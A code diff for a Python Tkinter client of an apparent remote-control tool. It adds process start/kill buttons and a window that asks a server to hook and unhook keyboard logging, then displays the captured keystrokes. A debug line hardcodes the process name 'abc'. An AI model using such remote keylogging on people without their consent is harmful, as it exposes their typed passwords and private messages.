@@ -155,7 +155,8 @@ class ProcessRunning(LowerLevel):
 
         self.btn_start_process = tk.Button(
             master=self.frame_start_kill,
-            text='Start'
+            text='Start',
+            command=self.start_process_command
         )
         self.btn_start_process.pack()
 
@@ -198,13 +199,13 @@ class ProcessRunning(LowerLevel):
             #master=
         )
 
-        process_name = self.entry_start_process.get()
+        # process_name = self.entry_start_process.get()
+        process_name = 'abc'
 
         self.request('process', 'start', process_name)
         (error_code, error_message, server_data) = self.receive_reply()
         if error_code == 0:
-            # TODO: Pop up a 'Process start successfully'
-            pass
+            tk.messagebox.showinfo('Start process', f'Start {process_name} successfully')
         else:
             tk.messagebox.showwarning('Error', error_message)
 
@@ -219,7 +220,96 @@ class ProcessRunning(LowerLevel):
         (error_code, error_message, server_data) = self.receive_reply()
 
         if error_code == 0:
-            # TODO: Pop up a 'Kill process {process_id} successfully'
-            pass
+            tk.messagebox.showinfo('Kill process', f'Kill process ID {process_id} successfully')
         else:
             tk.messagebox.showwarning('Error', error_message)
+
+class KeyloggerWindow(LowerLevel):
+    def __init__(self, top_level_window):
+        super().__init__(top_level_window)
+
+        # Frame for buttons
+        self.frame_button = tk.Frame(
+            master=self.root,
+        )
+
+        self.btn_hook = tk.Button(
+            master=self.frame_button,
+            text='Hook',
+            command=self.hook_command
+        )
+        self.btn_hook.pack()
+
+        self.btn_unhook = tk.Button(
+            master=self.frame_button,
+            text='Unhook',
+            state='disabled',
+            command=self.unhook_command
+        )
+        self.btn_unhook.pack()
+
+        self.btn_print = tk.Button(
+            master=self.frame_button,
+            text='Print',
+            state='disabled',
+            command=self.print_command
+        )
+        self.btn_print.pack()
+
+        self.btn_delete = tk.Button(
+            master=self.frame_button,
+            text='Delete',
+            state='disabled',
+            command=self.delete_command
+        )
+        self.btn_delete.pack()
+
+        self.text = tk.Text(
+            master=self.root,
+            padx=5,
+            pady=5,
+            state='disabled' # No text entry
+        )
+
+        self.frame_button.pack()
+        self.text.pack()
+
+        # A stream holding keystrokes hooked
+        self.keystroke_stream = ''
+
+    def hook_command(self):
+        self.request('keylogging', 'hook', '')
+        (error_code, error_message, server_data) = self.receive_reply()
+        
+        if error_code == 0:
+            self.keystroke_stream += server_data
+            self.btn_hook.configure(state='disabled')
+            self.btn_unhook.configure(state='active')
+        else:
+            tk.messagebox.showwarning('Error', error_message)
+
+    def unhook_command(self):
+        self.request('keylogging', 'unhook', '')
+        (error_code, error_message, server_data) = self.receive_reply()
+
+        if error_code == 0:
+            self.btn_hook.configure(state='active')
+            self.btn_print.configure(state='active')
+            self.btn_delete.configure(state='active')
+        else:
+            tk.messagebox.showwarning('Error', error_message)
+
+    def print_command(self):
+        self.text.configure(state='normal')
+        self.text.insert(1.0, self.keystroke_stream)
+        self.text.configure(state='disabled')
+
+    def delete_command(self):
+        self.text.configure(state='normal')
+        self.text.delete(1.0, tk.END)
+        self.text.configure(state='disabled')
+
+        self.btn_unhook.configure(state='disabled')
+        self.btn_print.configure(state='disabled')
+        self.btn_delete.configure(state='disabled')
+        self.keystroke_stream = ''
